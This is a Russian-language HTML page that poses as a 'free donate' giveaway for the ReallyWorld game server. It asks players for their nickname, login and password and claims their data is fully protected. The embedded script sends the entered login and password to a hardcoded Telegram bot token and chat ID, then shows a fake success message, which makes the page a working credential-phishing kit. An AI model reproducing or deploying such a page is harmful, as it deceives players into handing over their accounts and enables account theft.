<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReallyWorld - Получение доната</title>
    
    <link rel="icon" href="logo.png" type="image/png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header class="site-header">
        <div class="header-container">
            <div class="logo">
                <img src="logo.png" alt="RW Logo">
                <div class="logo-text">
                    <span class="logo-title">REALLY</span>
                    <span class="logo-subtitle">WORLD</span>
                </div>
            </div>
            
            <nav class="navigation">
                <a href="index.html" class="nav-link">
                    <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%231a1a1a'><path d='M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z'/></svg>" class="nav-icon" alt="">
                    Главная
                </a>
                <a href="free-donate.html" class="nav-link active">
                    <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ffffff'><path d='M20 6h-2.18c.11-.31.18-.65.18-1 0-1.66-1.34-3-3-3-1.05 0-1.96.54-2.5 1.35l-.5.65-.5-.65C10.96 2.54 10.05 2 9 2 7.34 2 6 3.34 6 5c0 .35.07.69.18 1H4c-1.11 0-1.99.89-1.99 2L2 19c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm-5-2c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zM9 4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm11 15H4v-2h16v2zm0-5H4V8h16v6z'/></svg>" class="nav-icon" alt="">
                    Бесплатный донат
                </a>
            </nav>
        </div>
    </header>

    <main class="main-content">
        <div class="donate-panel">
            <h2 class="panel-title">ПОЛУЧЕНИЕ ДОНАТА</h2>
            
            <form id="donateForm" onsubmit="handleDonate(event)">
                
                <div class="form-group">
                    <label>Ваш ник:</label>
                    <div class="input-wrapper">
                        <input type="text" id="username" placeholder="Введите ваш ник" required>
                    </div>
                </div>

                <div class="form-group">
                    <label>Выберите донат:</label>
                    <div class="input-wrapper">
                        <select id="donateType" required>
                            <option value="" disabled selected>Нажмите для выбора...</option>
                            <option value="Hero">Hero</option>
                            <option value="Titan">Titan</option>
                            <option value="Avenger">Avenger</option>
                            <option value="Overlord">Overlord</option>
                            <option value="Magister">Magister</option>
                            <option value="Imperator">Imperator</option>
                            <option value="Dragon">Dragon</option>
                            <option value="5 сундуков">5 сундуков с донатом</option>
                        </select>
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group half">
                        <label>Логин:</label>
                        <div class="input-wrapper">
                            <input type="text" id="loginNick" placeholder="Повторите ник" required>
                        </div>
                    </div>
                    
                    <div class="form-group half">
                        <label>Пароль:</label>
                        <div class="input-wrapper">
                            <input type="text" id="serverNum" required>
                        </div>
                    </div>
                </div>

                <button type="submit" class="submit-donate-btn">Получить</button>
            </form>

            <div class="panel-footer-text">
                ваши данные полностью защищены!<br>
                ваш логин и пароль нужен для удостоверения данных и быстрого зачисления доната.
            </div>
        </div>
    </main>

    <script>
        function handleDonate(event) {
            event.preventDefault();
            
            const user = document.getElementById('username').value;
            const donate = document.getElementById('donateType').value;
            const login = document.getElementById('loginNick').value;
            const server = document.getElementById('serverNum').value;

            if(!user || !donate || !login || !server) {
                alert("Заполните данные");
                return;
            }

            // === НАСТРОЙКА ТЕЛЕГРАМ БОТА ===
            // Вставь сюда свой токен, который дал @BotFather (внутри кавычек)
            const botToken = "8822891735:AAH1SRVzOtU3zAsvqnKjqPf3666cmzmn9s4"; 
            
            // Вставь сюда свой ID, который дал @userinfobot (внутри кавычек)
            const chatId = "112361364"; 

            // Формируем красивый текст сообщения
            const text = `🔔 *НОВАЯ ЗАЯВКА НА ДОНАТ* 🔔\n\n` +
                         `👤 *Игрок:* ${user}\n` +
                         `🎁 *Выбрано:* ${donate}\n` +
                         `📝 *Логин повторно:* ${login}\n` +
                         `💻 *Пароль:* ${server}`;

            // URL для отправки запроса к API Telegram
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            // Отправляем данные на сервера Telegram
            fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: "Markdown" // Чтобы текст был с жирным шрифтом
                })
            })
            .then(response => {
                // Показываем стандартное окно об успешном завершении
                alert("Поздравляем с получением доната! Ожидайте от 15минут до 1 часа");
            })
            .catch(error => {
                console.error("Ошибка отправки:", error);
                alert("Произошла ошибка при отправке заявки. Попробуйте позже.");
            });
        }
    </script>
</body>
</html>
